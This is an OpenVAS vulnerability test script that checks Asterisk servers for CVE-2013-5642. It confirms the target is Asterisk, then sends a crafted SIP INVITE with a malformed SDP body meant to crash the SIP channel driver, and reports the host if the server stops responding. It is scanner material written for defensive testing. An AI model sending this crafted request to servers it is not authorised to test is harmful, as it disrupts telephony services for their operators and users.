###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_asterisk_invalid_sdp_dos_vuln.nasl 33 2013-10-31 15:16:09Z veerendragg $
#
# Asterisk Products Invalid SDP SIP Channel Driver DoS Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802063";
CPE = "cpe:/a:digium:asterisk";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 33 $");
  script_cve_id("CVE-2013-5642");
  script_bugtraq_id(62022);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-31 16:16:09 +0100 (Do, 31. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-10-28 15:06:58 +0530 (Mon, 28 Oct 2013)");
  script_name("Asterisk Products Invalid SDP SIP Channel Driver DoS Vulnerability");

  tag_summary =
"This host is running Asterisk Server and is prone to denial of service
vulnerability.";

  tag_vuldetect =
"Send invalid SDP SIP request and check is it vulnerable to DoS or not.";

  tag_insight =
"Error within the SIP channel driver when handling a crafted SDP in a SIP
request.";

  tag_impact =
"Successful exploitation could allow remote attackers to cause a denial of
service via a crafted SDP in a SIP request.

Impact Level: Application";

  tag_affected =
"Asterisk Open Source 1.8.x to 1.8.23.0, 10.x to 10.12.2 and 11.x to 11.5.0
Certified Asterisk 1.8.15 to 1.8.15-cert2 and 11.2 to 11.2-cert1
Asterisk Digiumphones 10.x-digiumphones to 10.12.2-digiumphones";

  tag_solution =
"Upgrade to Asterisk Open Source to 1.8.23.1, 10.12.3, 11.5.1 or later,
Certified Asterisk to 1.8.15-cert3, 11.2-cert2 or later,
Asterisk Digiumphones 10.12.3-digiumphones or later,
For updates refer to http://www.asterisk.org";

 desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://osvdb.org/96690");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/54534");
  script_xref(name : "URL" , value : "https://issues.asterisk.org/jira/browse/ASTERISK-22007");
  script_xref(name : "URL" , value : "http://downloads.asterisk.org/pub/security/AST-2013-005.html");
  script_summary("Check Asterisk Server is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports("Services/udp/sip");
  exit(0);
}


## Variable initializations
asterisk_port = "";
normal_req  = "";
host_name = "";
this_host = "";
udp_soc = "";
udp_soc1 = "";
udp_soc2 = "";
res = "";
res2 = "";

## NOTE: Not using asterisk detect as the Asterisk is not responding
## to OPTIONS sip request even though it's allowed. 

## Get SIP Port
asterisk_port = get_kb_item("Services/udp/sip");
if(!asterisk_port){
  asterisk_port = 5060;
}

## Check asterisk port state
if(!get_udp_port_state(asterisk_port)){
  exit(0);
}

host_name = get_host_name();
if(!host_name) exit(0);

this_host = this_host();
if(!this_host) exit(0);

## Construct normal "INVITE" request
normal_req = string( "INVITE sip:test@", host_name, ":", asterisk_port, " SIP/2.0", "\r\n",
                     "Via: SIP/2.0/UDP", this_host, ":", asterisk_port,";branch=y9hG4bK-14811-1-0","\r\n",
                     "From: test1 <sip:ovtest@", this_host, ":", asterisk_port, ";tag=1", "\r\n",
                     "To: test <sip:test@", host_name, ":", asterisk_port, ">", "\r\n",
                     "Call-ID: 1-25911@", this_host, "\r\n",
                     "CSeq: 1 INVITE", "\r\n",
                     "Contact: sip:kartoffelsalat@", this_host, ":", asterisk_port, "\r\n",
                     "Max-Forwards: 10", "\r\n",
                     "Subject: OpenVAS Normal Test", "\r\n",
                     "User-Agent: OpenVAS Test", "\r\n",
                     "Content-Length: 0", "\r\n\r\n");

## Create UDP Soc
udp_soc = open_sock_udp(asterisk_port);

## Send normal request and Receive response
send(socket:udp_soc, data:normal_req);
res = recv(socket:udp_soc, length:1024);
close(udp_soc);

sleep(2);

## Confirm Asterisk server
if("SIP/2.0" >!< res || "Server: Asterisk" >!< res){
  exit(0);
}

## Crafted post data
con_data = string("v=0", "\r\n",
                  "o=user1 53655765 2353687637 IN IP4", this_host,"\r\n",
                  "s=-", "\r\n",
                  "t=0 0", "\r\n",
                  "m=audio 6000 RTP/AVP 8 0", "\r\n",
                  "m=video 6002 RTP/AVP 31", "\r\n",
                  "c=IN IP4", this_host);

## Construct "INVITE" request with invalid user
craf_req = string( "INVITE sip:test@", host_name, ":", asterisk_port, " SIP/2.0", "\r\n",
                   "Via: SIP/2.0/UDP", this_host, ":", asterisk_port,";branch=z9hG4bK-25912-1-0","\r\n",
                   "From: test1 <sip:guest0@", this_host, ":", asterisk_port, ";tag=1", "\r\n",
                   "To: test <sip:test@", host_name, ":", asterisk_port, ">", "\r\n",
                   "Call-ID: 1-25912@", this_host, "\r\n",
                   "CSeq: 1 INVITE", "\r\n",
                   "Contact: sip:kartoffelsalat@", this_host, ":", asterisk_port, "\r\n",
                   "Max-Forwards: 70", "\r\n",
                   "Subject: DoS Test", "\r\n",
                   "User-Agent: OpenVAS DoS Test", "\r\n",
                   "Content-Type: application/sdp", "\r\n",
                   "Content-Length:   ", strlen(con_data), "\r\n\r\n",
                   con_data, "\r\n");

## Send crafted sip request and receive response
udp_soc1 = open_sock_udp(asterisk_port);
send(socket:udp_soc1, data:craf_req);

res = recv(socket:udp_soc1, length:1024);
close(udp_soc1);

sleep(2);

## Constructing new request as Call-ID and branch should not match with previous one
## If it's same then asterisk will not respond back

## Construct normal "INVITE" request
normal_req1 = string( "INVITE sip:test@", host_name, ":", asterisk_port, " SIP/2.0", "\r\n",
                     "Via: SIP/2.0/UDP", this_host, ":", asterisk_port,";branch=yasdas4bK-14811-1-0","\r\n",
                     "From: test1 <sip:ovtest@", this_host, ":", asterisk_port, ";tag=1", "\r\n",
                     "To: test <sip:test@", host_name, ":", asterisk_port, ">", "\r\n",
                     "Call-ID: 1-252341@", this_host, "\r\n",
                     "CSeq: 1 INVITE", "\r\n",
                     "Contact: sip:kartoffelsalat@", this_host, ":", asterisk_port, "\r\n",
                     "Max-Forwards: 10", "\r\n",
                     "Subject: OpenVAS Normal Test", "\r\n",
                     "User-Agent: OpenVAS Test", "\r\n",
                     "Content-Length: 0", "\r\n\r\n");

## Create UDP socket to check asterisk is dead or alive
udp_soc2 = open_sock_udp(asterisk_port);
if(!udp_soc2)
{
  security_warning(asterisk_port);
  exit(0);
}

## Check Asterisk is responding or it's dead
send(socket:udp_soc2, data:normal_req1);
res2 = recv(socket:udp_soc2, length:1024);
close(udp_soc2);

## Confirm Asterisk server dead or alive
if("Server: Asterisk" >!< res2)
{
  security_warning(asterisk_port);
  exit(0);
}
